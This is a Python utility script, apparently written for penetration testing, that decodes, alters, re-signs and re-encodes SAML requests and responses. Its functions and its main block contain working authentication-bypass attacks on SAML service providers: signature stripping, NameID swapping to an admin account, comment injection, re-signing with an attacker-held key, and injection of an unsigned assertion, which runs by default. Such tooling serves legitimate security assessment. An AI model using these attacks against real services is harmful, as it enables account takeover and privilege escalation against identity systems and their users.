"""
Utility Python3 script to manually alter a SAML Request/Response in order to manually inspect the behavior of a service validating/using the SAML Request/Response.

Useful to analyze specific cases returning a different/strange response content/code/length during the application study.

Dependencies:
    pip install lxml signxml cryptography

References:
    https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations
    https://stackoverflow.com/questions/64295570/sign-saml-response-in-python
    https://signxml.readthedocs.io/en/latest/
    https://www.samltool.com/format_x509cert.php
    https://github.com/onelogin/python-saml/blob/master/src/onelogin/saml2/utils.py

PEM format expected for the Certificate and the Private key - Key pair length must be >= 2048 bits:
    Certificate:
        -----BEGIN CERTIFICATE-----
        MIIC/zCCA...
        -----END CERTIFICATE-----

    Private key:
        -----BEGIN PRIVATE KEY-----
        MIIEvAIBA...
        -----END PRIVATE KEY-----
"""
import base64
import urllib.parse
import re
import zlib
import uuid
import xml.etree.ElementTree as ET
from lxml import etree
from signxml import XMLSigner
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from datetime import datetime, timezone

DEFAULT_ENCODING = "utf-8"
DEBUG = True
SAML_NAMESPACES = {"ds": "http://www.w3.org/2000/09/xmldsig#", "samlp": "urn:oasis:names:tc:SAML:2.0:protocol", "saml": "urn:oasis:names:tc:SAML:2.0:assertion"}


def decode_saml_response(saml_content):
    return base64.b64decode(saml_content.encode(DEFAULT_ENCODING)).decode(DEFAULT_ENCODING)


def encode_saml_response(saml_content):
    return base64.b64encode(saml_content.encode(DEFAULT_ENCODING)).decode(DEFAULT_ENCODING)


def decode_saml_request(saml_content):
    # Taken from
    # https://github.com/onelogin/python-saml/blob/master/src/onelogin/saml2/utils.py#L98
    decoded = base64.b64decode(saml_content.encode(DEFAULT_ENCODING))
    try:
        result = zlib.decompress(decoded, -15)
    except Exception:
        result = decoded
    return result.decode(DEFAULT_ENCODING)


def encode_saml_request(saml_content):
    # Taken from
    # https://github.com/onelogin/python-saml/blob/master/src/onelogin/saml2/utils.py#L116
    return base64.b64encode(zlib.compress(saml_content.encode(DEFAULT_ENCODING))[2:-4])


def load_from_file(saml_content_file_location):
    with open(saml_content_file_location, "r", encoding=DEFAULT_ENCODING) as f:
        saml_content = urllib.parse.unquote(f.read())
    return saml_content


def save_to_file(saml_content_file_location, saml_content, url_encode=True):
    with open(saml_content_file_location, "w", encoding=DEFAULT_ENCODING) as f:
        content = saml_content
        if url_encode:
            content = urllib.parse.quote(content)
        f.write(content)


def extract_nodes(xpath_expr, saml_content):
    root = ET.fromstring(saml_content)
    return root.findall(xpath_expr, SAML_NAMESPACES)


def signature_omits_comments(saml_content):
    # See explanation on https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations
    algos_not_omitting_comments_in_signature = ["http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments",
                                                "http://www.w3.org/2001/10/xml-exc-c14n#WithComments",
                                                "http://www.w3.org/2006/12/xml-c14n11#WithComments"]
    result = True
    nodes = extract_nodes(".//ds:CanonicalizationMethod", saml_content)
    for node in nodes:
        if node.attrib["Algorithm"] in algos_not_omitting_comments_in_signature:
            result = False
    return result


def remove_assertion_signatures(saml_content):
    # Remove the content of the node "<ds:SignatureValue></ds:SignatureValue>" from all assertion signature of a SAML response
    # Exploit a case in which the Service Provider verify the signature only if it is present
    # Use a string approach to not risk to alter the response with an XML parser if it was already altered in case of vulnerabilities chaining
    signature_regex = r'<ds:SignatureValue>([a-zA-Z0-9\/=+]+)<\/ds:SignatureValue>'
    saml_content_altered = re.sub(signature_regex, "<ds:SignatureValue></ds:SignatureValue>", saml_content)
    return saml_content_altered


def sign_saml_response_assertion(saml_content, certificate_pem_content, private_key_pem_content, canonicalization_algo="http://www.w3.org/2001/10/xml-exc-c14n#", signature_algo="rsa-sha256", digest_algo="sha256", add_namespace_on_keyinfo_tag=False):
    # Remove any existing '<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">...</ds:Signature>' node
    # /!!!\ Currently only support a single Assertion node in a SAML response
    while "</ds:Signature>" in saml_content:
        start = saml_content.index("<ds:Signature")
        end = saml_content.index("</ds:Signature>")
        saml_content = saml_content[:start] + saml_content[end+len("</ds:Signature>"):]
    # Taken from https://stackoverflow.com/a/64355750
    assertion_identifier = extract_nodes(".//saml:Assertion", saml_content)[0].attrib["ID"]
    saml_root = etree.fromstring(saml_content)
    xml_signer = XMLSigner(c14n_algorithm=canonicalization_algo, signature_algorithm=signature_algo, digest_algorithm=digest_algo)
    signed_saml_root = xml_signer.sign(saml_root, key=private_key_pem_content, cert=certificate_pem_content, reference_uri=assertion_identifier)
    signed_saml_root_str = etree.tostring(signed_saml_root, encoding="unicode")
    # Move the Signature node into the Assertion node
    signature_block_start = signed_saml_root_str.index("<ds:Signature")
    signature_block_end = signed_saml_root_str.index("</ds:Signature>")
    signature_block = signed_saml_root_str[signature_block_start:signature_block_end + len("</ds:Signature>")]
    signed_saml_root_str = signed_saml_root_str[:signature_block_start] + signed_saml_root_str[signature_block_end + len("</ds:Signature>"):]
    subject_tag_name = "<saml:Subject>"
    if subject_tag_name not in signed_saml_root_str:
        subject_tag_name = "<Subject>"
    signed_saml_root_str = signed_saml_root_str.replace(subject_tag_name, f"{signature_block}{subject_tag_name}")
    if add_namespace_on_keyinfo_tag:
        # The "signxml" lib produce a KeyInfo tag without the DS SAML namespace on the node like this: <ds:KeyInfo>...</ds:KeyInfo>
        # Depending on the parser of the SP it can cause trouble so this option allow adding the DS SAML namespace directly in the KeyInfo node
        # like this: <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">...</KeyInfo>
        signed_saml_root_str = signed_saml_root_str.replace('<ds:KeyInfo>', f"<KeyInfo xmlns=\"{SAML_NAMESPACES['ds']}\">")
        signed_saml_root_str = signed_saml_root_str.replace('</ds:KeyInfo>', '</KeyInfo>')
    signed_saml_root_str = signed_saml_root_str.replace("\n", "").replace("\r", "").strip()
    return signed_saml_root_str


def extract_algorithms_used(saml_content):
    algos = {"Signature": [], "Digest": []}
    for type_algo in algos:
        nodes = extract_nodes(f".//ds:{type_algo}Method", saml_content)
        for node in nodes:
            alg = node.attrib["Algorithm"].split("#")[1].lower().strip()
            if alg not in algos[type_algo]:
                algos[type_algo].append(alg)
    return algos


def extract_certificate_infos(saml_content):
    certs = []
    nodes = extract_nodes(f".//ds:X509Certificate", saml_content)
    for node in nodes:
        cert_base64 = node.text
        pem_data = base64.b64decode(cert_base64.encode(DEFAULT_ENCODING))
        certif = x509.load_der_x509_certificate(pem_data, default_backend())
        certs.append({"Fingerprint": certif.fingerprint(hashes.SHA256()).hex(),
                      "Version": certif.version,
                      "Issuer": certif.issuer,
                      "Subject": certif.subject,
                      "NotValidBefore": certif.not_valid_before,
                      "NotValidAfter": certif.not_valid_after})
    return certs


def add_unsigned_assertion_into_saml_response(saml_content, assertion_content, add_on_top=True):
    # Use a string approach to not risk to alter the response with an XML parser if it was already altered in case of vulnerabilities chaining
    updated_content = saml_content
    assertion_tpl = f"<Assertion xmlns=\"{SAML_NAMESPACES['saml']}\" ID=\"_%s\" IssueInstant=\"%s\" Version=\"2.0\">%s</Assertion>"
    # Format UTC date time: 2022-05-14T12:31:20Z
    new_assertion_date_time = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    new_assertion_uid = str(uuid.uuid4())
    new_assertion = assertion_tpl % (new_assertion_uid, new_assertion_date_time, assertion_content)
    if add_on_top:
        assertion_tag_ref = f"<Assertion "
        position = updated_content.index(assertion_tag_ref)
        updated_content = updated_content[:position] + new_assertion + updated_content[position:]
    else:
        assertion_tag_ref = f"</Assertion>"
        position = updated_content.rindex(assertion_tag_ref)
        updated_content = updated_content[:position+len(assertion_tag_ref)] + new_assertion + updated_content[position+len(assertion_tag_ref):]
    return updated_content


if __name__ == "__main__":
    # ---------------------------------------------
    # Workspace context
    # ---------------------------------------------
    input_saml_response_file = "1-saml_response_encoded.txt"
    output_saml_response_file = "2-saml_response_encoded_altered.txt"
    debug_file = "3-saml_debug.xml"
    with open("4-example.crt", mode="r", encoding=DEFAULT_ENCODING) as f:
        certificate_pem_content = f.read()
    with open("5-example.key", mode="r", encoding=DEFAULT_ENCODING) as f:
        private_key_pem_content = f.read()
    input_saml_request_file = "6-saml_request_encoded.txt"
    output_saml_request_file = "7-saml_request_encoded_altered.txt"

    # ---------------------------------------------
    # Do action on SAML Request content
    # ---------------------------------------------

    # -- Load and decode the SAML Request content
    # saml_content = decode_saml_request(load_from_file(input_saml_request_file))

    # -- Update the destination SP
    # saml_content = saml_content.replace("AssertionConsumerServiceURL='http://sp1-xxx.domain.com/saml/consume'", "AssertionConsumerServiceURL='http://sp2-xxx.domain.com/saml/consume'")

    # -- Encode and save the altered SAML Request content
    # save_to_file(output_saml_request_file, encode_saml_request(saml_content))

    # ---------------------------------------------
    # Do action on SAML Response content
    # ---------------------------------------------

    # -- Load and decode the SAML Response content
    saml_content = decode_saml_response(load_from_file(input_saml_response_file))

    # -- Print algorithms used for Signature and Digest as well as Signature canonicalization as well as Certificate infos
    # print(extract_algorithms_used(saml_content))
    # print(f"Signature omits comments? {signature_omits_comments(saml_content)}")
    # print(extract_certificate_infos(saml_content))

    # -- Attack with direct NameID replacement without modifying the assertion signature
    # saml_content = saml_content.replace("user@test.com", "admin@test.com")

    # -- Attack with Comment injection: Require that signature omits comments !!!
    #print(f"Signature omits comments? {signature_omits_comments(saml_content)}")
    #saml_content = saml_content.replace("admin@test.com", "admin@test.co<!--x-->m")

    # -- Attack with signature stripping and NameID replacement
    # saml_content = remove_assertion_signatures(saml_content)
    # saml_content = saml_content.replace("user@test.com", "admin@test.com")

    # -- Attack with re-signing a SAML response with a specified key pair and certificate
    # saml_content = saml_content.replace("user@test.com", "admin@test.com")
    # saml_content = sign_saml_response_assertion(saml_content, certificate_pem_content, private_key_pem_content)

    # -- Attack with adding of an new unsigned assertion on the top of the first signed assertion to abuse
    # -- the fact that when retrieving the NameID, the SAML library or the application leveraging the SAML library
    # -- may not return the same NameID as the one it verified.
    new_assertion_content = "<Subject><NameID>admin@test.com</NameID></Subject>"
    saml_content = add_unsigned_assertion_into_saml_response(saml_content, new_assertion_content, True)

    # -- Encode and save the altered SAML Response content
    save_to_file(output_saml_response_file, encode_saml_response(saml_content))

    # ---------------------------------------------
    # Save raw non base64 encoded
    # (or deflated in case of SAML request)
    # content for debugging purpose
    # ---------------------------------------------
    if DEBUG:
        save_to_file(debug_file, saml_content, False)
